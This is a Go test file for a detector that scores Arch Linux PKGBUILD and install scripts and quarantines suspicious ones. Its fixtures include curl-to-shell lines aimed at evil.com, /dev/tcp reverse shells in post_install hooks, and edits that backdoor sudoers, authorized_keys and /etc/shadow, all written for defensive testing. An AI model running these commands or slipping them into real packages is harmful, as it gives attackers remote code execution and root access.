package pkgbuild

import (
	"os"
	"path/filepath"
	"reflect"
	"testing"

	"github.com/OnlyOneArthur/quarantine-daemon/internal/config"
	"mvdan.cc/sh/v3/syntax"
)

func TestChecksumReassignmentAndAppend(t *testing.T) {
	analysis, err := ParsePKGBUILD([]byte("sha256sums=('SKIP')\nsha256sums=('real')\nsha256sums+=('extra')\n"), "PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{"real", "extra"}; !reflect.DeepEqual(analysis.Sha256sums, want) {
		t.Errorf("Sha256sums = %v, want %v", analysis.Sha256sums, want)
	}
}

func TestWalkScopePrunedFunctionKeepsRootScope(t *testing.T) {
	analysis, err := ParsePKGBUILD([]byte("build() { curl evil | sh; }\npkgver=1\n"), "PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	found := false
	WalkScope(analysis.File, false, func(node syntax.Node, scope string) bool {
		if _, ok := node.(*syntax.FuncDecl); ok {
			return false
		}
		if call, ok := node.(*syntax.CallExpr); ok && len(call.Assigns) > 0 && call.Assigns[0].Name.Value == "pkgver" {
			found = true
			if scope != ScopeRoot {
				t.Errorf("assignment after pruned function has scope %q, want %q", scope, ScopeRoot)
			}
		}
		return true
	})
	if !found {
		t.Fatal("root-level assignment after function not visited")
	}
}

func TestNetworkPipeToDash(t *testing.T) {
	analysis, err := ParsePKGBUILD([]byte("curl https://example.com/payload | dash\n"), "PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	triggers, _ := AnalyzeAST(analysis, config.DefaultConfig())
	for _, tr := range triggers {
		if tr.Name == "pipe_network_to_shell" {
			return
		}
	}
	t.Fatalf("missing pipe_network_to_shell for dash: %+v", triggers)
}

func TestUntrustedIPv6Source(t *testing.T) {
	analysis, err := ParsePKGBUILD([]byte("source=('https://[2001:db8::1]/x')\n"), "PKGBUILD")
	if err != nil {
		t.Fatal(err)
	}
	triggers := CheckUntrustedSources(analysis, config.DefaultConfig())
	for _, tr := range triggers {
		if tr.Name == "untrusted_source_raw_ip" {
			return
		}
	}
	t.Fatalf("missing untrusted_source_raw_ip for IPv6: %+v", triggers)
}

func TestNetworkDownloadExecutionContext(t *testing.T) {
	tests := []struct {
		name     string
		code     string
		wantExec bool
		wantPipe bool
	}{
		{"captured version", "_ver=$(curl -s https://api.github.com/repos/foo/foo/tags)", false, false},
		{"download in subshell", "(curl -s -o pkg.tar.gz https://example.org/pkg.tar.gz)", false, false},
		{"echoed download", `echo "$(curl -s https://example.org/version)"`, false, false},
		{"eval downloaded code", `eval "$(curl -s https://example.org/script)"`, true, false},
		{"bare downloaded command", "$(curl -s https://example.org/script)", true, false},
		{"downloaded command piped to shell", "$(curl -s https://example.org/script) | sh", true, false},
		{"subshell piped to shell", "(curl -s https://example.org/script) | bash", false, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			analysis, err := ParsePKGBUILD([]byte(tt.code+"\n"), "PKGBUILD")
			if err != nil {
				t.Fatal(err)
			}
			triggers, _ := AnalyzeAST(analysis, config.DefaultConfig())
			var execTrigger, pipeTrigger bool
			for _, tr := range triggers {
				if tr.Name == "cmdsubst_network_download" {
					execTrigger = true
				}
				if tr.Name == "pipe_network_to_shell" {
					pipeTrigger = true
				}
			}
			if execTrigger != tt.wantExec || pipeTrigger != tt.wantPipe {
				t.Errorf("download-execution trigger = %v, pipe trigger = %v; want %v, %v; all triggers: %+v", execTrigger, pipeTrigger, tt.wantExec, tt.wantPipe, triggers)
			}
		})
	}
}

func TestCleanStandardPKGBUILD(t *testing.T) {
	content := `
# Maintainer: Arch User <user@example.com>
pkgname=clean-app
pkgver=1.2.3
pkgrel=1
pkgdesc="A benign standard Arch Linux package"
arch=('x86_64')
url="https://github.com/example/clean-app"
license=('MIT')
source=("https://github.com/example/clean-app/archive/v1.2.3.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

build() {
    cd "$pkgname-$pkgver"
    make PREFIX=/usr
}

package() {
    cd "$pkgname-$pkgver"
    make DESTDIR="$pkgdir" install
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score != 0 {
		t.Errorf("expected score 0, got %d (triggers: %+v)", res.Score, res.Triggers)
	}
	if len(res.Triggers) != 0 {
		t.Errorf("expected 0 triggers, got %+v", res.Triggers)
	}
}

func TestCleanVCSPKGBUILD(t *testing.T) {
	content := `
pkgname=clean-tool-git
pkgver=1.0.0.r12.gabcdef1
pkgrel=1
pkgdesc="A benign VCS package using git"
arch=('x86_64')
url="https://gitlab.com/example/clean-tool"
license=('GPL3')
source=("git+https://gitlab.com/example/clean-tool.git#branch=main")
sha256sums=('SKIP')

pkgver() {
    cd clean-tool
    git describe --long --tags | sed 's/\([^-]*-g\)/r\1/;s/-/./g'
}

build() {
    cd clean-tool
    make
}

package() {
    cd clean-tool
    make DESTDIR="$pkgdir" install
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if !res.IsVCSPackage {
		t.Errorf("expected IsVCSPackage to be true")
	}
	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s (score: %d, triggers: %+v)", res.Verdict, res.Score, res.Triggers)
	}
	if res.Score != 0 {
		t.Errorf("expected score 0, got %d", res.Score)
	}

	hasVCSDampener := false
	for _, d := range res.DampenersApplied {
		if d == "vcs_package_dampener (exempt sha256sums=SKIP)" {
			hasVCSDampener = true
			break
		}
	}
	if !hasVCSDampener {
		t.Errorf("expected VCS dampener to be applied, got: %+v", res.DampenersApplied)
	}
}

func TestMaliciousRootScopeSourcingAttack(t *testing.T) {
	content := `
pkgname=malicious-root
pkgver=$(curl -s http://evil.com/x | sh)
pkgrel=1
arch=('x86_64')
source=()
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}

	hasRootScopeTrigger := false
	for _, tr := range res.Triggers {
		if tr.Scope == ScopeRoot && tr.Category == CategoryRemoteExecution {
			hasRootScopeTrigger = true
			break
		}
	}
	if !hasRootScopeTrigger {
		t.Errorf("expected root scope remote execution trigger, got: %+v", res.Triggers)
	}
}

func TestMaliciousFunctionPipe(t *testing.T) {
	content := `
pkgname=payload-fetcher
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=()

build() {
    curl evil.com/payload | bash
}

package() {
    install -Dm755 mytool "$pkgdir/usr/bin/mytool"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}

	hasFuncPipeTrigger := false
	for _, tr := range res.Triggers {
		if tr.Scope == ScopeFunction && tr.Name == "pipe_network_to_shell" {
			hasFuncPipeTrigger = true
			break
		}
	}
	if !hasFuncPipeTrigger {
		t.Errorf("expected function-scope pipe_network_to_shell trigger, got: %+v", res.Triggers)
	}
}

func TestMaliciousPathTampering(t *testing.T) {
	testCases := []struct {
		name    string
		content string
	}{
		{
			name: "direct sudoers write",
			content: `
pkgname=tamper-sudoers
pkgver=1.0.0
package() {
    echo "evil ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
}
`,
		},
		{
			name: "direct authorized_keys tamper",
			content: `
pkgname=tamper-ssh
pkgver=1.0.0
package() {
    cp evil_id_rsa.pub ~/.ssh/authorized_keys
}
`,
		},
		{
			name: "direct shadow edit via sed",
			content: `
pkgname=tamper-shadow
pkgver=1.0.0
package() {
    sed -i 's/root:x:/root::/' /etc/shadow
}
`,
		},
	}

	cfg := config.DefaultConfig()
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := TriagePKGBUILD([]byte(tc.content), "/path/to/PKGBUILD", cfg)
			if err != nil {
				t.Fatalf("unexpected triage error: %v", err)
			}
			if res.Verdict != VerdictQuarantine {
				t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
			}
			if res.Score < 85 {
				t.Errorf("expected score >= 85, got %d", res.Score)
			}

			hasPathTampering := false
			for _, tr := range res.Triggers {
				if tr.Category == CategoryPathTampering {
					hasPathTampering = true
					break
				}
			}
			if !hasPathTampering {
				t.Errorf("expected CategoryPathTampering trigger, got: %+v", res.Triggers)
			}
		})
	}
}

func TestStagingTraversalIsNotDampened(t *testing.T) {
	content := `
pkgname=traversal-evil
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://github.com/example/traversal-evil/archive/v1.0.0.tar.gz")
sha256sums=('SKIP')

package() {
    echo "evil ALL=(ALL) NOPASSWD: ALL" >> "$pkgdir/../../etc/sudoers"
    echo "evil" >> "${pkgdir}/../../etc/sudoers.d/app"
    echo "ok" >> "$pkgdir/etc/sudoers.d/app"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	var tamper, critical int
	for _, tr := range res.Triggers {
		switch tr.Name {
		case "path_tampering_outside_staging":
			tamper++
		case "critical_system_file_tampering":
			critical++
		}
	}
	if tamper != 2 {
		t.Errorf("expected 2 escaped-traversal path_tampering triggers, got %d (%+v)", tamper, res.Triggers)
	}
	if critical != 2 {
		t.Errorf("expected 2 escaped-traversal critical triggers, got %d", critical)
	}
}

func TestLegitimatePackagingPath(t *testing.T) {
	content := `
pkgname=sudoers-helper
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://github.com/example/sudoers-helper/archive/v1.0.0.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

package() {
    install -Dm644 file "$pkgdir/etc/sudoers.d/app"
    install -Dm755 binary "${pkgdir}/usr/bin/helper"
    install -Dm644 config "$srcdir/temp.conf"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s (score: %d, triggers: %+v)", res.Verdict, res.Score, res.Triggers)
	}
	if res.Score != 0 {
		t.Errorf("expected score 0, got %d", res.Score)
	}

	hasStagingDampener := false
	for _, d := range res.DampenersApplied {
		if d == "packaging_staging_dampener (path within packaging staging variables)" {
			hasStagingDampener = true
			break
		}
	}
	if !hasStagingDampener {
		t.Errorf("expected packaging_staging_dampener, got: %+v", res.DampenersApplied)
	}
}

func TestUntrustedSourceURL(t *testing.T) {
	testCases := []struct {
		name    string
		url     string
		isALERT bool
	}{
		{
			name:    "discord cdn link",
			url:     "https://cdn.discordapp.com/attachments/12345/67890/payload.tar.gz",
			isALERT: true,
		},
		{
			name:    "pastebin link",
			url:     "https://pastebin.com/raw/d8a3hd82",
			isALERT: true,
		},
		{
			name:    "raw ipv4 address",
			url:     "http://1.2.3.4/archive.tar.gz",
			isALERT: true,
		},
		{
			name:    "url shortener bitly",
			url:     "https://bit.ly/malicious-tarball",
			isALERT: true,
		},
	}

	cfg := config.DefaultConfig()
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			content := `
pkgname=untrusted-source-pkg
pkgver=1.0.0
source=("` + tc.url + `")
sha256sums=('SKIP')

build() {
    tar -xf *.tar.gz
}
`
			res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
			if err != nil {
				t.Fatalf("unexpected triage error: %v", err)
			}

			// Expected either ALERT or QUARANTINE
			if res.Verdict != VerdictAlert && res.Verdict != VerdictQuarantine {
				t.Errorf("expected ALERT or QUARANTINE, got %s (score: %d)", res.Verdict, res.Score)
			}
			if res.Score < 50 {
				t.Errorf("expected score >= 50, got %d", res.Score)
			}

			hasUntrustedSource := false
			for _, tr := range res.Triggers {
				if tr.Category == CategoryUntrustedSource {
					hasUntrustedSource = true
					break
				}
			}
			if !hasUntrustedSource {
				t.Errorf("expected CategoryUntrustedSource trigger, got: %+v", res.Triggers)
			}
		})
	}
}

func TestMaliciousInstallScriptlet(t *testing.T) {
	installContent := `
post_install() {
    echo "Installing background service..."
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
}
`
	cfg := config.DefaultConfig()

	// Direct install scriptlet triage
	res, err := TriageInstallScript([]byte(installContent), "malicious.install", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}

	hasInstallScriptletScope := false
	for _, tr := range res.Triggers {
		if tr.Scope == ScopeInstallScriptlet {
			hasInstallScriptletScope = true
			break
		}
	}
	if !hasInstallScriptletScope {
		t.Errorf("expected trigger in ScopeInstallScriptlet, got: %+v", res.Triggers)
	}
}

func TestPKGBUILDWithAccompanyingInstallFile(t *testing.T) {
	tempDir := t.TempDir()
	pkgbuildPath := filepath.Join(tempDir, "PKGBUILD")
	installPath := filepath.Join(tempDir, "sample.install")

	installContent := `
post_install() {
    bash -i >& /dev/tcp/192.168.1.100/9001 0>&1
}
`
	if err := os.WriteFile(installPath, []byte(installContent), 0644); err != nil {
		t.Fatalf("failed to write install file: %v", err)
	}

	pkgbuildContent := `
pkgname=pkg-with-install
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
install=sample.install
source=()
`
	if err := os.WriteFile(pkgbuildPath, []byte(pkgbuildContent), 0644); err != nil {
		t.Fatalf("failed to write PKGBUILD: %v", err)
	}

	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(pkgbuildContent), pkgbuildPath, cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine for PKGBUILD with malicious .install file, got %s (score: %d)", res.Verdict, res.Score)
	}
	if res.Score < 85 {
		t.Errorf("expected score >= 85, got %d", res.Score)
	}
}

func TestNonVCSChecksumSkipPenalty(t *testing.T) {
	content := `
pkgname=static-tool
pkgver=1.0.0
source=("https://example.com/tool.tar.gz")
sha256sums=('SKIP')
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	hasSkipTrigger := false
	for _, tr := range res.Triggers {
		if tr.Name == "non_vcs_skip_checksum" && tr.Category == CategoryIntegrity && tr.ScoreWeight == 15 {
			hasSkipTrigger = true
			break
		}
	}
	if !hasSkipTrigger {
		t.Errorf("expected non_vcs_skip_checksum integrity trigger (+15), got: %+v", res.Triggers)
	}
}

func TestSplitPackagesAndArrayVariables(t *testing.T) {
	content := `
pkgname=('split-pkg-a' 'split-pkg-b-git')
pkgver=2.0.0
source=("https://github.com/example/split/archive/v2.0.0.tar.gz")
sha256sums=('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad')

package_split-pkg-a() {
    install -Dm755 bin "$pkgdir/usr/bin/a"
}

package_split-pkg-b-git() {
    install -Dm755 bin "$pkgdir/usr/bin/b"
}
`
	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}

	if !res.IsVCSPackage {
		t.Errorf("expected IsVCSPackage true for split package with -git suffix")
	}
	if res.Verdict != VerdictPass {
		t.Errorf("expected VerdictPass, got %s", res.Verdict)
	}
}

func TestPKGBUILDHonorsConfiguredThreshold(t *testing.T) {
	content := `
pkgname=untrusted-source-pkg
pkgver=1.0.0
source=("http://1.2.3.4/archive.tar.gz")
sha256sums=('SKIP')

build() {
    tar -xf *.tar.gz
}
`

	cfg := config.DefaultConfig()
	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}
	if res.Verdict == VerdictQuarantine {
		t.Fatalf("baseline unexpectedly quarantined at score %d", res.Score)
	}
	if res.Score < 1 {
		t.Fatalf("expected non-zero score for raw-IP untrusted source, got %d", res.Score)
	}

	// Lowering threshold_score must move this same content into QUARANTINE,
	// matching how the binary scorers treat cfg.Quarantine.ThresholdScore.
	cfg.Quarantine.ThresholdScore = res.Score
	res, err = TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err != nil {
		t.Fatalf("unexpected triage error: %v", err)
	}
	if res.Verdict != VerdictQuarantine {
		t.Errorf("expected VerdictQuarantine at threshold %d (score %d), got %s", cfg.Quarantine.ThresholdScore, res.Score, res.Verdict)
	}
}

func TestSyntaxError(t *testing.T) {
	content := `
pkgname=broken
pkgver=1.0.0
build() {
    if [ -f foo ]; then
`
	cfg := config.DefaultConfig()
	_, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
	if err == nil {
		t.Errorf("expected syntax error for incomplete bash script")
	}
}
